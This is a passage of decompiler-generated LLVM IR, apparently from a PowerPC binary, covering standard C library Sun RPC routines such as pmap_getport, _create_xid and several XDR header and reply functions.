  %v0_10011eb0 = load i32, i32* %r23.global-to-local, align 4
  %v1_10011eb0 = inttoptr i32 %v0_10011eb0 to i32*
  %v2_10011eb0 = load i32, i32* %v1_10011eb0, align 4
  store i32 %v2_10011eb0, i32* %r3.global-to-local, align 4
  %v1_10011eb4 = add i32 %v2_10011eb0, 32
  %v2_10011eb4 = inttoptr i32 %v1_10011eb4 to i32*
  %v3_10011eb4 = load i32, i32* %v2_10011eb4, align 4
  store i32 %v3_10011eb4, i32* %r9.global-to-local, align 4
  %v1_10011eb8 = add i32 %v3_10011eb4, 12
  %v2_10011eb8 = inttoptr i32 %v1_10011eb8 to i32*
  %v3_10011eb8 = load i32, i32* %v2_10011eb8, align 4
  store i32 %v3_10011eb8, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10011eb8)
  %v0_10011ec4 = load i32, i32* %r3.global-to-local, align 4
  %v3_10011ec4 = icmp eq i32 %v0_10011ec4, 0
  br i1 %v3_10011ec4, label %dec_label_pc_10011edc, label %dec_label_pc_10011ecc

dec_label_pc_10011ecc:                            ; preds = %dec_label_pc_10011eb0
  %v0_10011ecc = load i32, i32* %r17.global-to-local, align 4
  %v1_10011ecc = add i32 %v0_10011ecc, -1
  store i32 %v1_10011ecc, i32* %r17.global-to-local, align 4
  %v0_100119f0.pre = load i32, i32* %r20.global-to-local, align 4
  %v0_100119f4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100119f0

dec_label_pc_10011ed4:                            ; preds = %dec_label_pc_10011e08
  %v1_10011ed8 = load i32, i32* @r30, align 4
  %v2_10011ed8 = add i32 %v1_10011ed8, 44
  %v3_10011ed8 = inttoptr i32 %v2_10011ed8 to i32*
  store i32 2, i32* %v3_10011ed8, align 4
  br label %dec_label_pc_10011edc

dec_label_pc_10011edc:                            ; preds = %dec_label_pc_10011eb0, %dec_label_pc_10011ea8, %dec_label_pc_10011e84, %dec_label_pc_10011e90, %dec_label_pc_10011ed4
  %v0_10011edc = load i32, i32* @r30, align 4
  %v1_10011edc = add i32 %v0_10011edc, 44
  %v2_10011edc = inttoptr i32 %v1_10011edc to i32*
  %v3_10011edc = load i32, i32* %v2_10011edc, align 4
  store i32 %v3_10011edc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011ee0

dec_label_pc_10011ee0:                            ; preds = %dec_label_pc_10011c38, %dec_label_pc_100119cc, %dec_label_pc_10011edc
  %v0_10011ef4 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10011ef4

; uselistorder directives
  uselistorder i32 %v0_10011d94, { 1, 0, 2 }
  uselistorder i32 %v0_10011c1c.lcssa, { 1, 0 }
  uselistorder i32 %v1_10011c10, { 1, 0 }
  uselistorder i32 %v2_10011bf0, { 1, 2, 0, 3 }
  uselistorder i32 %v2_10011be0, { 2, 3, 0, 1, 6, 4, 5, 7, 8 }
  uselistorder i32 %v0_10011bd4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_10011bbc, { 1, 0 }
  uselistorder i32 %v0_10011bac.pre, { 1, 0 }
  uselistorder i32 %v2_10011b30, { 1, 0, 2 }
  uselistorder i32 %v0_10011abc, { 1, 0, 3, 2 }
  uselistorder i32 %v2_10011e1c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10011e08, { 1, 0, 2 }
  uselistorder i32 %v1_10011c54, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 32, 34, 33, 14, 15, 16, 17, 18, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 19, 20, 31, 0 }
  uselistorder i32* %r3.global-to-local, { 34, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 43, 25, 26, 27, 28, 30, 31, 32, 33, 35, 36, 37, 38, 39, 40, 41, 42, 0, 29, 1 }
  uselistorder i32* %r24.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r22.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r21.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r20.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r19.global-to-local, { 1, 3, 2, 0, 4 }
  uselistorder i32* %r18.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 92, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_recvmsg, { 1, 0 }
  uselistorder i32 8192, { 1, 0, 2, 3 }
  uselistorder i32 27, { 0, 1, 3, 2, 10, 11, 12, 13, 9, 14, 4, 5, 15, 6, 7, 8, 16 }
  uselistorder i32 -983040, { 1, 0 }
  uselistorder i32 1000000, { 2, 0, 1, 3 }
  uselistorder i32 8800, { 1, 2, 0, 3, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 1, 0 }
  uselistorder i32 88, { 1, 2, 3, 4, 11, 12, 0, 10, 9, 5, 6, 7, 8 }
  uselistorder i32 1000, { 1, 0 }
  uselistorder label %dec_label_pc_10011ee0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011edc, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10011e84, { 1, 0 }
  uselistorder label %dec_label_pc_10011d90, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10011c38, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011c30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011c1c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10011bc8, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10011ba8, { 1, 0 }
  uselistorder label %dec_label_pc_10011b74, { 1, 0 }
  uselistorder label %dec_label_pc_10011b10, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_10011ae0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100119e0, { 1, 0 }
  uselistorder label %dec_label_pc_100119cc, { 1, 0 }
  uselistorder label %dec_label_pc_100119c4, { 1, 0 }
}

define i32 @_create_xid(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v2_10011f10 = ptrtoint i32* %stack_var_-44 to i32
  %v4_10011f24 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-44, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 ptrtoint (i32* @global_var_10033920.496 to i32))
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r29, align 4
  store i32 268508980, i32* @lr, align 4
  %v1_10011f30 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10033920.496 to i32))
  %v3_10011f34 = load i32, i32* @global_var_1002f08c.497, align 4
  %v3_10011f40 = icmp eq i32 %v3_10011f34, 0
  br i1 %v3_10011f40, label %dec_label_pc_10011f48, label %dec_label_pc_10011f6c

dec_label_pc_10011f48:                            ; preds = %entry
  %v2_10011f3c = ptrtoint i32* %stack_var_-52 to i32
  store i32 268509004, i32* @lr, align 4
  %v2_10011f48 = call i32 @gettimeofday(i32 %v2_10011f3c, i32 0)
  %v3_10011f4c = load i32, i32* %stack_var_-52, align 4
  %v2_10011f5c = xor i32 %v3_10011f4c, %tmp
  %v2_10011f60 = trunc i32 %v2_10011f5c to i16
  %v3_10011f60 = call i32 @__GI_srand48_r(i16 %v2_10011f60, i32 ptrtoint (i32* @global_var_10033938.498 to i32))
  store i32 1, i32* @global_var_1002f08c.497, align 4
  br label %dec_label_pc_10011f6c

dec_label_pc_10011f6c:                            ; preds = %entry, %dec_label_pc_10011f48
  %v2_10011f70 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268509052, i32* @lr, align 4
  %v2_10011f78 = call i32 @lrand48_r(i32 ptrtoint (i32* @global_var_10033938.498 to i32), i32 %v2_10011f70)
  store i32 %v2_10011f10, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268509064, i32* @lr, align 4
  %v0_10011f84 = call i32 @__pthread_cleanup_pop_restore()
  %v3_10011f8c = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_10011f8c

; uselistorder directives
  uselistorder label %dec_label_pc_10011f6c, { 1, 0 }
}

define i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-72 = alloca i16, align 2
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 400, i32* @r8, align 4
  %v3_10011fc0 = add i32 %arg1, 2
  %v4_10011fc0 = inttoptr i32 %v3_10011fc0 to i16*
  store i16 111, i16* %v4_10011fc0, align 2
  %v2_10011fd4 = ptrtoint i32* %stack_var_-40 to i32
  store i16 0, i16* %stack_var_-72, align 2
  store i32 %v2_10011fd4, i32* @r6, align 4
  %v2_10011ff4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_10011ff4, i32* @r7, align 4
  store i32 400, i32* @r9, align 4
  store i32 %arg1, i32* @r26, align 4
  store i32 -1, i32* %stack_var_-68, align 4
  store i32 5, i32* %stack_var_-40, align 4
  store i32 268509204, i32* @lr, align 4
  %v6_10012010 = call i32 @__GI_clntudp_bufcreate(i32 100000, i32 2, i32 %v2_10011fd4)
  store i32 %v6_10012010, i32* %r3.global-to-local, align 4
  store i32 %v6_10012010, i32* @r31, align 4
  %v3_10012014 = icmp eq i32 %v6_10012010, 0
  br i1 %v3_10012014, label %dec_label_pc_100120d8, label %dec_label_pc_1001201c

dec_label_pc_1001201c:                            ; preds = %entry
  store i32 268509216, i32* @lr, align 4
  %v0_1001201c = call i32 @__GI___rpc_thread_createerr()
  store i32 0, i32* @r10, align 4
  store i32 %v0_1001201c, i32* @r30, align 4
  store i32 60, i32* %stack_var_-40, align 4
  %v2_1001206c = ptrtoint i16* %stack_var_-72 to i32
  store i32 %v2_1001206c, i32* @r8, align 4
  %v0_10012070 = load i32, i32* @r31, align 4
  store i32 %v0_10012070, i32* %r3.global-to-local, align 4
  %v1_10012074 = add i32 %v0_10012070, 4
  %v2_10012074 = inttoptr i32 %v1_10012074 to i32*
  %v3_10012074 = load i32, i32* %v2_10012074, align 4
  %v1_10012078 = inttoptr i32 %v3_10012074 to i32*
  %v2_10012078 = load i32, i32* %v1_10012078, align 4
  call void @__pseudo_call(i32 %v2_10012078)
  %v0_10012084 = load i32, i32* @r30, align 4
  %v0_10012088 = load i32, i32* %r3.global-to-local, align 4
  %v3_10012088 = icmp eq i32 %v0_10012088, 0
  %v0_1001208c = load i32, i32* @r31, align 4
  store i32 %v0_1001208c, i32* %r3.global-to-local, align 4
  br i1 %v3_10012088, label %dec_label_pc_100120b0, label %dec_label_pc_10012094

dec_label_pc_10012094:                            ; preds = %dec_label_pc_1001201c
  %v2_10012098 = inttoptr i32 %v0_10012084 to i32*
  store i32 14, i32* %v2_10012098, align 4
  %v0_1001209c = load i32, i32* @r31, align 4
  %v1_1001209c = add i32 %v0_1001209c, 4
  %v2_1001209c = inttoptr i32 %v1_1001209c to i32*
  %v3_1001209c = load i32, i32* %v2_1001209c, align 4
  %v1_100120a0 = add i32 %v3_1001209c, 8
  %v2_100120a0 = inttoptr i32 %v1_100120a0 to i32*
  %v3_100120a0 = load i32, i32* %v2_100120a0, align 4
  call void @__pseudo_call(i32 %v3_100120a0)
  br label %dec_label_pc_100120c4

dec_label_pc_100120b0:                            ; preds = %dec_label_pc_1001201c
  %v3_100120b0 = load i16, i16* %stack_var_-72, align 2
  %v3_100120b4 = icmp eq i16 %v3_100120b0, 0
  br i1 %v3_100120b4, label %dec_label_pc_100120bc, label %dec_label_pc_100120c4

dec_label_pc_100120bc:                            ; preds = %dec_label_pc_100120b0
  %v2_100120c0 = inttoptr i32 %v0_10012084 to i32*
  store i32 15, i32* %v2_100120c0, align 4
  br label %dec_label_pc_100120c4

dec_label_pc_100120c4:                            ; preds = %dec_label_pc_100120b0, %dec_label_pc_10012094, %dec_label_pc_100120bc
  %v0_100120c4 = load i32, i32* @r31, align 4
  %v1_100120c4 = add i32 %v0_100120c4, 4
  %v2_100120c4 = inttoptr i32 %v1_100120c4 to i32*
  %v3_100120c4 = load i32, i32* %v2_100120c4, align 4
  store i32 %v0_100120c4, i32* %r3.global-to-local, align 4
  %v1_100120cc = add i32 %v3_100120c4, 16
  %v2_100120cc = inttoptr i32 %v1_100120cc to i32*
  %v3_100120cc = load i32, i32* %v2_100120cc, align 4
  call void @__pseudo_call(i32 %v3_100120cc)
  %v3_100120dc.pre = load i16, i16* %stack_var_-72, align 2
  %phitmp = sext i16 %v3_100120dc.pre to i32
  br label %dec_label_pc_100120d8

dec_label_pc_100120d8:                            ; preds = %entry, %dec_label_pc_100120c4
  %v3_100120dc = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_100120c4 ]
  store i32 %v3_100120dc, i32* %r3.global-to-local, align 4
  %v2_100120e0 = load i32, i32* @r26, align 4
  %v3_100120e0 = add i32 %v2_100120e0, 2
  %v4_100120e0 = inttoptr i32 %v3_100120e0 to i16*
  store i16 0, i16* %v4_100120e0, align 2
  ret i32 %v3_100120dc

; uselistorder directives
  uselistorder i32 %v3_100120dc, { 1, 0 }
  uselistorder i16* %stack_var_-72, { 0, 3, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_100120d8, { 1, 0 }
  uselistorder label %dec_label_pc_100120c4, { 2, 0, 1 }
}

define i32 @__GI_xdr_pmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_100120f8 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 268509460, i32* @lr, align 4
  %v0_10012110 = call i32 @xdr_u_long()
  %v0_10012114 = load i32, i32* @r31, align 4
  %v1_10012114 = add i32 %v0_10012114, 4
  store i32 %v1_10012114, i32* @r4, align 4
  %v3_10012118 = icmp eq i32 %v0_10012110, 0
  %v0_1001211c = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1001211c, i32* @r3, align 4
  br i1 %v3_10012118, label %dec_label_pc_10012160, label %dec_label_pc_10012124

dec_label_pc_10012124:                            ; preds = %entry
  store i32 268509480, i32* @lr, align 4
  %v0_10012124 = call i32 @xdr_u_long()
  %v0_10012128 = load i32, i32* @r31, align 4
  %v1_10012128 = add i32 %v0_10012128, 8
  store i32 %v1_10012128, i32* @r4, align 4
  %v3_1001212c = icmp eq i32 %v0_10012124, 0
  %v0_10012130 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10012130, i32* @r3, align 4
  br i1 %v3_1001212c, label %dec_label_pc_10012160, label %dec_label_pc_10012138

dec_label_pc_10012138:                            ; preds = %dec_label_pc_10012124
  store i32 268509500, i32* @lr, align 4
  %v0_10012138 = call i32 @xdr_u_long()
  %v0_1001213c = load i32, i32* @r31, align 4
  %v1_1001213c = add i32 %v0_1001213c, 12
  store i32 %v1_1001213c, i32* @r4, align 4
  %v3_10012140 = icmp eq i32 %v0_10012138, 0
  %v0_10012144 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10012144, i32* @r3, align 4
  br i1 %v3_10012140, label %dec_label_pc_10012160, label %dec_label_pc_1001214c

dec_label_pc_1001214c:                            ; preds = %dec_label_pc_10012138
  store i32 %v0_100120f8, i32* @lr, align 4
  %v0_1001215c = call i32 @xdr_u_long()
  br label %dec_label_pc_10012160

dec_label_pc_10012160:                            ; preds = %dec_label_pc_10012138, %dec_label_pc_10012124, %entry, %dec_label_pc_1001214c
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_10012160, { 3, 0, 1, 2 }
}

define i32 @__GI__seterr_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v1_10012178 = add i32 %arg1, 8
  %v2_10012178 = inttoptr i32 %v1_10012178 to i32*
  %v3_10012178 = load i32, i32* %v2_10012178, align 4
  store i32 %v3_10012178, i32* @r10, align 4
  %v3_1001217c = icmp eq i32 %v3_10012178, 0
  br i1 %v3_1001217c, label %dec_label_pc_10012190, label %dec_label_pc_10012184

dec_label_pc_10012184:                            ; preds = %entry
  %v3_10012184 = icmp eq i32 %v3_10012178, 1
  br i1 %v3_10012184, label %dec_label_pc_10012210, label %dec_label_pc_10012248

dec_label_pc_10012190:                            ; preds = %entry
  %v1_10012190 = add i32 %arg1, 24
  %v2_10012190 = inttoptr i32 %v1_10012190 to i32*
  %v3_10012190 = load i32, i32* %v2_10012190, align 4
  store i32 %v3_10012190, i32* %r11.global-to-local, align 4
  %v3_10012194 = icmp eq i32 %v3_10012190, 0
  br i1 %v3_10012194, label %dec_label_pc_1001219c, label %dec_label_pc_100121a4

dec_label_pc_1001219c:                            ; preds = %dec_label_pc_10012190
  store i32 0, i32* %arg2, align 4
  ret i32 %arg1

dec_label_pc_100121a4:                            ; preds = %dec_label_pc_10012190
  %v2_100121a4 = icmp ugt i32 %v3_10012190, 5
  br i1 %v2_100121a4, label %dec_label_pc_100121fc, label %dec_label_pc_100121ac

dec_label_pc_100121ac:                            ; preds = %dec_label_pc_100121a4
  %v1_100121b0 = mul i32 %v3_10012190, 4
  store i32 %v1_100121b0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10019fd4.506 to i32), i32* %r9.global-to-local, align 4
  %v2_100121b8 = add i32 %v1_100121b0, ptrtoint (i32* @global_var_10019fd4.506 to i32)
  %v3_100121b8 = inttoptr i32 %v2_100121b8 to i32*
  %v4_100121b8 = load i32, i32* %v3_100121b8, align 4
  %v2_100121bc = add i32 %v4_100121b8, ptrtoint (i32* @global_var_10019fd4.506 to i32)
  store i32 %v2_100121bc, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_100121bc)
  br label %dec_label_pc_100121d4

dec_label_pc_100121d4:                            ; preds = %dec_label_pc_10012210, %dec_label_pc_100121ac
  %storemerge1 = phi i32 [ 8, %dec_label_pc_100121ac ], [ 7, %dec_label_pc_10012210 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  store i32 %storemerge1, i32* %arg2, align 4
  br label %dec_label_pc_10012258

dec_label_pc_100121fc:                            ; preds = %dec_label_pc_100121a4
  store i32 16, i32* %r0.global-to-local, align 4
  %v2_10012200 = add i32 %tmp, 4
  %v3_10012200 = inttoptr i32 %v2_10012200 to i32*
  store i32 0, i32* %v3_10012200, align 4
  %v0_10012204 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10012204, i32* %arg2, align 4
  %v0_10012208 = load i32, i32* %r11.global-to-local, align 4
  %v2_10012208 = add i32 %tmp, 8
  %v3_10012208 = inttoptr i32 %v2_10012208 to i32*
  store i32 %v0_10012208, i32* %v3_10012208, align 4
  br label %dec_label_pc_10012258thread-pre-split

dec_label_pc_10012210:                            ; preds = %dec_label_pc_10012184
  %v1_10012210 = add i32 %arg1, 12
  %v2_10012210 = inttoptr i32 %v1_10012210 to i32*
  %v3_10012210 = load i32, i32* %v2_10012210, align 4
  store i32 %v3_10012210, i32* %r9.global-to-local, align 4
  %v3_10012214 = icmp eq i32 %v3_10012210, 1
  br i1 %v3_10012214, label %dec_label_pc_100121d4, label %dec_label_pc_1001221c

dec_label_pc_1001221c:                            ; preds = %dec_label_pc_10012210
  %v3_1001221c = icmp eq i32 %v3_10012210, 6
  br i1 %v3_1001221c, label %dec_label_pc_10012224, label %dec_label_pc_10012234

dec_label_pc_10012224:                            ; preds = %dec_label_pc_1001221c
  store i32 6, i32* %arg2, align 4
  br label %dec_label_pc_10012258

dec_label_pc_10012234:                            ; preds = %dec_label_pc_1001221c
  store i32 16, i32* %r0.global-to-local, align 4
  %v2_10012238 = add i32 %tmp, 4
  %v3_10012238 = inttoptr i32 %v2_10012238 to i32*
  store i32 1, i32* %v3_10012238, align 4
  %v0_1001223c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1001223c, i32* %arg2, align 4
  %v0_10012240 = load i32, i32* %r9.global-to-local, align 4
  %v2_10012240 = add i32 %tmp, 8
  %v3_10012240 = inttoptr i32 %v2_10012240 to i32*
  store i32 %v0_10012240, i32* %v3_10012240, align 4
  br label %dec_label_pc_10012258thread-pre-split

dec_label_pc_10012248:                            ; preds = %dec_label_pc_10012184
  store i32 16, i32* %r0.global-to-local, align 4
  store i32 16, i32* %arg2, align 4
  %v3_10012250 = load i32, i32* %v2_10012178, align 4
  store i32 %v3_10012250, i32* %r0.global-to-local, align 4
  %v2_10012254 = add i32 %tmp, 4
  %v3_10012254 = inttoptr i32 %v2_10012254 to i32*
  store i32 %v3_10012250, i32* %v3_10012254, align 4
  br label %dec_label_pc_10012258thread-pre-split

dec_label_pc_10012258thread-pre-split:            ; preds = %dec_label_pc_10012248, %dec_label_pc_100121fc, %dec_label_pc_10012234
  %v2_10012258.pr = load i32, i32* %arg2, align 4
  br label %dec_label_pc_10012258

dec_label_pc_10012258:                            ; preds = %dec_label_pc_10012258thread-pre-split, %dec_label_pc_100121d4, %dec_label_pc_10012224
  %v0_1001226c = phi i32 [ %v2_10012258.pr, %dec_label_pc_10012258thread-pre-split ], [ %storemerge1, %dec_label_pc_100121d4 ], [ 6, %dec_label_pc_10012224 ]
  store i32 %v0_1001226c, i32* %r0.global-to-local, align 4
  %v3_1001225c = icmp eq i32 %v0_1001226c, 7
  br i1 %v3_1001225c, label %dec_label_pc_10012284, label %dec_label_pc_10012264

dec_label_pc_10012264:                            ; preds = %dec_label_pc_10012258
  %v3_10012264 = icmp eq i32 %v0_1001226c, 9
  br i1 %v3_10012264, label %dec_label_pc_10012290, label %dec_label_pc_1001226c

dec_label_pc_1001226c:                            ; preds = %dec_label_pc_10012264
  %v0_10012270 = load i32, i32* @lr, align 4
  %v2_10012270 = icmp ne i32 %v0_1001226c, 6
  call void @__pseudo_cond_branch(i1 %v2_10012270, i32 %v0_10012270)
  %v1_10012274 = add i32 %arg1, 16
  %v2_10012274 = inttoptr i32 %v1_10012274 to i32*
  %v3_10012274 = load i32, i32* %v2_10012274, align 4
  store i32 %v3_10012274, i32* %r0.global-to-local, align 4
  %v2_10012278 = add i32 %tmp, 4
  %v3_10012278 = inttoptr i32 %v2_10012278 to i32*
  store i32 %v3_10012274, i32* %v3_10012278, align 4
  %v1_1001227c = add i32 %arg1, 20
  br label %dec_label_pc_1001229c

dec_label_pc_10012284:                            ; preds = %dec_label_pc_10012258
  %v1_10012284 = add i32 %arg1, 16
  %v2_10012284 = inttoptr i32 %v1_10012284 to i32*
  %v3_10012284 = load i32, i32* %v2_10012284, align 4
  store i32 %v3_10012284, i32* %r0.global-to-local, align 4
  %v2_10012288 = add i32 %tmp, 4
  %v3_10012288 = inttoptr i32 %v2_10012288 to i32*
  store i32 %v3_10012284, i32* %v3_10012288, align 4
  ret i32 %arg1

dec_label_pc_10012290:                            ; preds = %dec_label_pc_10012264
  %v1_10012290 = add i32 %arg1, 28
  %v2_10012290 = inttoptr i32 %v1_10012290 to i32*
  %v3_10012290 = load i32, i32* %v2_10012290, align 4
  store i32 %v3_10012290, i32* %r0.global-to-local, align 4
  %v2_10012294 = add i32 %tmp, 4
  %v3_10012294 = inttoptr i32 %v2_10012294 to i32*
  store i32 %v3_10012290, i32* %v3_10012294, align 4
  %v1_10012298 = add i32 %arg1, 32
  br label %dec_label_pc_1001229c

dec_label_pc_1001229c:                            ; preds = %dec_label_pc_1001226c, %dec_label_pc_10012290
  %storemerge.in.in = phi i32 [ %v1_1001227c, %dec_label_pc_1001226c ], [ %v1_10012298, %dec_label_pc_10012290 ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_1001229c = add i32 %tmp, 8
  %v3_1001229c = inttoptr i32 %v2_1001229c to i32*
  store i32 %storemerge, i32* %v3_1001229c, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v0_1001226c, { 0, 1, 3, 2 }
  uselistorder i32 %v1_100121b0, { 1, 0 }
  uselistorder i32 %tmp, { 3, 8, 0, 6, 4, 1, 2, 5, 7 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 13, 9, 10 }
  uselistorder i32* %arg2, { 0, 6, 5, 4, 2, 3, 1, 7 }
  uselistorder i32 %arg1, { 2, 5, 3, 0, 4, 6, 9, 7, 8, 1, 10 }
  uselistorder label %dec_label_pc_1001229c, { 1, 0 }
  uselistorder label %dec_label_pc_10012258, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10012258thread-pre-split, { 0, 2, 1 }
}

define i32 @__GI_xdr_callhdr(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_100122a4 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_100122bc = add i32 %arg2, 4
  %v3_100122bc = inttoptr i32 %v2_100122bc to i32*
  store i32 0, i32* %v3_100122bc, align 4
  %v2_100122c4 = add i32 %arg2, 8
  %v3_100122c4 = inttoptr i32 %v2_100122c4 to i32*
  store i32 2, i32* %v3_100122c4, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_100122cc = load i32, i32* %arg1, align 4
  %v3_100122d0 = icmp eq i32 %v2_100122cc, 0
  br i1 %v3_100122d0, label %dec_label_pc_100122d8, label %dec_label_pc_1001233c

dec_label_pc_100122d8:                            ; preds = %entry
  store i32 268509916, i32* @lr, align 4
  %v0_100122d8 = call i32 @xdr_u_long()
  %v3_100122e0 = icmp eq i32 %v0_100122d8, 0
  %v0_100122e4 = load i32, i32* @r31, align 4
  store i32 %v0_100122e4, i32* @r3, align 4
  br i1 %v3_100122e0, label %dec_label_pc_1001233c, label %dec_label_pc_100122ec

dec_label_pc_100122ec:                            ; preds = %dec_label_pc_100122d8
  store i32 268509936, i32* @lr, align 4
  %v0_100122ec = call i32 @xdr_enum()
  %v0_100122f0 = load i32, i32* @r30, align 4
  %v1_100122f0 = add i32 %v0_100122f0, 8
  store i32 %v1_100122f0, i32* @r4, align 4
  %v3_100122f4 = icmp eq i32 %v0_100122ec, 0
  %v0_100122f8 = load i32, i32* @r31, align 4
  store i32 %v0_100122f8, i32* @r3, align 4
  br i1 %v3_100122f4, label %dec_label_pc_1001233c, label %dec_label_pc_10012300

dec_label_pc_10012300:                            ; preds = %dec_label_pc_100122ec
  store i32 268509956, i32* @lr, align 4
  %v0_10012300 = call i32 @xdr_u_long()
  %v0_10012304 = load i32, i32* @r30, align 4
  %v1_10012304 = add i32 %v0_10012304, 12
  store i32 %v1_10012304, i32* @r4, align 4
  %v3_10012308 = icmp eq i32 %v0_10012300, 0
  %v0_1001230c = load i32, i32* @r31, align 4
  store i32 %v0_1001230c, i32* @r3, align 4
  br i1 %v3_10012308, label %dec_label_pc_1001233c, label %dec_label_pc_10012314

dec_label_pc_10012314:                            ; preds = %dec_label_pc_10012300
  store i32 268509976, i32* @lr, align 4
  %v0_10012314 = call i32 @xdr_u_long()
  %v0_10012318 = load i32, i32* @r30, align 4
  %v1_10012318 = add i32 %v0_10012318, 16
  store i32 %v1_10012318, i32* @r4, align 4
  %v3_1001231c = icmp eq i32 %v0_10012314, 0
  %v0_10012320 = load i32, i32* @r31, align 4
  store i32 %v0_10012320, i32* @r3, align 4
  br i1 %v3_1001231c, label %dec_label_pc_1001233c, label %dec_label_pc_10012328

dec_label_pc_10012328:                            ; preds = %dec_label_pc_10012314
  store i32 %v0_100122a4, i32* @lr, align 4
  %v0_10012338 = call i32 @xdr_u_long()
  br label %dec_label_pc_1001233c

dec_label_pc_1001233c:                            ; preds = %entry, %dec_label_pc_10012314, %dec_label_pc_10012300, %dec_label_pc_100122ec, %dec_label_pc_100122d8, %dec_label_pc_10012328
  ret i32 0

; uselistorder directives
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1001233c, { 5, 1, 2, 3, 4, 0 }
}

define i32 @__GI_xdr_rejected_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r3, align 4
  %v0_10012354 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  store i32 268510064, i32* @lr, align 4
  %v0_1001236c = call i32 @xdr_enum()
  %v3_10012370 = icmp eq i32 %v0_1001236c, 0
  br i1 %v3_10012370, label %dec_label_pc_100123dc, label %dec_label_pc_10012378

dec_label_pc_10012378:                            ; preds = %entry
  %v0_10012378 = load i32, i32* @r31, align 4
  %v1_10012378 = inttoptr i32 %v0_10012378 to i32*
  %v2_10012378 = load i32, i32* %v1_10012378, align 4
  %v1_1001237c = add i32 %v0_10012378, 4
  store i32 %v1_1001237c, i32* @r4, align 4
